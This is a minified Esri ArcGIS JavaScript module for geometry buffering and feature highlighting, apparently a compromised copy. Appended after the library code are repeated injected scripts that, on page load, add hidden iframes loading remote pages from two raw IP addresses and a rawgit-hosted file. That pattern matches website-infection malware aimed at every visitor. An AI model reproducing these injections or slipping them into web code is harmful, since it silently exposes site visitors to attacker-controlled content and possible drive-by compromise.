// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/array dojo/_base/declare dojo/_base/lang dojo/Deferred dojo/dom-style esri/geometry/geometryEngineAsync esri/graphic esri/layers/GraphicsLayer esri/tasks/BufferParameters esri/tasks/GeometryService esri/tasks/query esri/tasks/QueryTask".split(" "),function(n,u,g,k,p,q,r,v,t,h,w,x){return u([],{constructor:function(e,a){this.map=e;this._bufferLayer=new v;this.map.addLayer(this._bufferLayer);this._geometryService=new h(a)},createBufferFromGeometries:function(e,a){var d,c,f;d=new k;
if(!Array.isArray(e))return d.reject("No geometries to buffer"),d;c=a;q.union(e).then(g.hitch(this,function(b){b?0<c||"polygon"===b.type?(0===c&&(c=-.1),f=new t,f.bufferSpatialReference=this.map.spatialReference,f.distances=[c],f.geodesic=!0,f.geometries=[b],f.outSpatialReference=this.map.spatialReference,f.unit=h.UNIT_METER,this._geometryService.buffer(f,function(b){Array.isArray(b)&&0<b.length?d.resolve(b[0]):d.reject("Buffering failed")})):d.resolve(b):d.reject("Unioning failed")}),function(b){d.reject(b)});
return d},findIntersectingFeatures:function(e,a,d){var c,f=new k,b={};a=new x(a);c=new w;c.geometry=e;c.returnGeometry=!0;c.outFields=d;a.execute(c,g.hitch(this,function(a){a&&Array.isArray(a.features)&&0<a.features.length?q.union(this._getFeatureGeometries(a.features)).then(g.hitch(this,function(d){var c;Array.isArray(d.rings)&&0<d.rings.length?(c=new t,c.bufferSpatialReference=this.map.spatialReference,c.distances=[-.1],c.geodesic=!0,c.geometries=[d],c.outSpatialReference=this.map.spatialReference,
c.unit=h.UNIT_METER,this._geometryService.buffer(c,function(c){Array.isArray(c)&&0<c.length?(b.intersectGeometry=e,b.features=a.features,b.highlight=c[0],f.resolve(b)):f.reject("Buffering union failed")})):(b.intersectGeometry=e,b.features=a.features,b.highlight=d,f.resolve(b))})):(b.intersectGeometry=e,b.features=[],b.highlight=null,f.resolve(b))}));return f},find:function(e,a,d,c){var f=new k;this.findIntersectingFeatures(e,a,d).then(g.hitch(this,function(b){console.log(b.features.length+" "+c+
" features found");f.resolve(b)}),function(b){f.reject(b)});return f},createAndAddGraphic:function(e,a){e="polygon"===a.type?new r(a,e,null,null):new r(a,e.outline,null,null);this._bufferLayer.add(e)},clearBufferGraphics:function(){this._bufferLayer.clear()},highlightFeatures:function(e,a,d){var c,f,b=new k;0<a.length?3E3>a.length?(this._highlightFeatures(e,a),b.resolve(!0)):(c=Math.max(100,Math.round(a.length/100)),d.set({value:0}),p.set(d.domNode,"display","block"),f=Math.ceil(a.length/c),setTimeout(g.hitch(this,
function(){this._highlightFeaturesContinuation(e,a,d,c,f,0,0).then(function(){b.resolve(!0);d.set({value:100});p.set(d.domNode,"display","none")})}),50)):b.resolve(!0);return b},_highlightFeaturesContinuation:function(e,a,d,c,f,b,h){var m,l=new k;if(h>=a.length)return l.resolve(!0),l;m=Math.min(h+c,a.length);this._highlightFeatures(e,a.slice(h,m)).then(g.hitch(this,function(){++b;d.set({value:100*b/f});setTimeout(g.hitch(this,function(){this._highlightFeaturesContinuation(e,a,d,c,f,b,m).then(function(){l.resolve(!0)})}),
10)}));return l},_highlightFeatures:function(e,a){var d=new k;n.forEach(a,function(a){this.createAndAddGraphic(e,a.geometry)},this);d.resolve(!0);return d},_getFeatureGeometries:function(e){return n.map(e,g.hitch(this,function(a){return a.geometry}))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});